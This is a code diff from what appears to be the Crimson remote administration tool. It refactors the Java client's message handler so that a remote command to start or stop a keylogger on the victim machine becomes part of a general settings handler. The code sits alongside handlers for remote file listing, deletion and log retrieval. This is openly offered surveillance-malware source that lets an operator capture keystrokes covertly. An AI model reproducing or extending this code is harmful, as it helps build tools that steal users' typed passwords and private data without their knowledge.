@@ -45,11 +45,11 @@ import com.subterranean_security.crimson.core.net.ConnectionState;
 import com.subterranean_security.crimson.core.proto.ClientAuth.MI_GroupChallengeResult;
 import com.subterranean_security.crimson.core.proto.ClientAuth.RQ_GroupChallenge;
 import com.subterranean_security.crimson.core.proto.ClientAuth.RS_GroupChallenge;
+import com.subterranean_security.crimson.core.proto.ClientControl.RS_ChangeSetting;
 import com.subterranean_security.crimson.core.proto.FileManager.RQ_FileListing;
 import com.subterranean_security.crimson.core.proto.FileManager.RS_Delete;
 import com.subterranean_security.crimson.core.proto.FileManager.RS_FileHandle;
 import com.subterranean_security.crimson.core.proto.FileManager.RS_FileListing;
-import com.subterranean_security.crimson.core.proto.Keylogger.RS_KeyloggerStateChange;
 import com.subterranean_security.crimson.core.proto.Keylogger.State;
 import com.subterranean_security.crimson.core.proto.Log.LogFile;
 import com.subterranean_security.crimson.core.proto.Log.LogType;
@@ -135,8 +135,8 @@ public class ClientExecutor extends BasicExecutor {
 						rq_delete(m);
 					} else if (m.hasRqLogs()) {
 						rq_logs(m);
-					} else if (m.hasRqKeyloggerStateChange()) {
-						rq_keylogger_state_changed(m);
+					} else if (m.hasRqChangeSetting()) {
+						rq_change_setting(m);
 					} else {
 						connector.cq.put(m.getId(), m);
 					}
@@ -389,24 +389,32 @@ public class ClientExecutor extends BasicExecutor {
 				.route(Message.newBuilder().setId(m.getId()).setRid(m.getSid()).setSid(Common.cvid).setRsLogs(rs));
 	}
 
-	private void rq_keylogger_state_changed(Message m) {
+	private void rq_change_setting(Message m) {
 		Outcome.Builder outcome = Outcome.newBuilder();
-		if (m.getRqKeyloggerStateChange().getNewState() == State.ONLINE) {
-			try {
-				Keylogger.start(Client.ic.getKeyloggerFlushMethod(), Client.ic.getKeyloggerFlushValue());
+		if (m.getRqChangeSetting().hasKeyloggerState()) {
+			if (m.getRqChangeSetting().getKeyloggerState() == State.ONLINE) {
+				try {
+					Keylogger.start(Client.ic.getKeyloggerFlushMethod(), Client.ic.getKeyloggerFlushValue());
+					outcome.setResult(true);
+				} catch (HeadlessException e) {
+					outcome.setResult(false).setComment("HeadlessException");
+				} catch (NativeHookException e) {
+					outcome.setResult(false).setComment(e.getMessage());
+				}
+			} else {
+				Keylogger.stop();
 				outcome.setResult(true);
-			} catch (HeadlessException e) {
-				outcome.setResult(false).setComment("HeadlessException");
-			} catch (NativeHookException e) {
-				outcome.setResult(false).setComment(e.getMessage());
 			}
-		} else {
-			Keylogger.stop();
-			outcome.setResult(true);
+		}
+		if (m.getRqChangeSetting().hasFlushMethod()) {
+			// TODO update ic
+		}
+		if (m.getRqChangeSetting().hasFlushValue()) {
+			// TODO update ic
 		}
 
 		ClientStore.Connections.route(Message.newBuilder().setId(m.getId()).setRid(m.getSid()).setSid(Common.cvid)
-				.setRsKeyloggerStateChange(RS_KeyloggerStateChange.newBuilder().setResult(outcome)));
+				.setRsChangeSetting(RS_ChangeSetting.newBuilder().setResult(outcome)));
 	}
 
 }
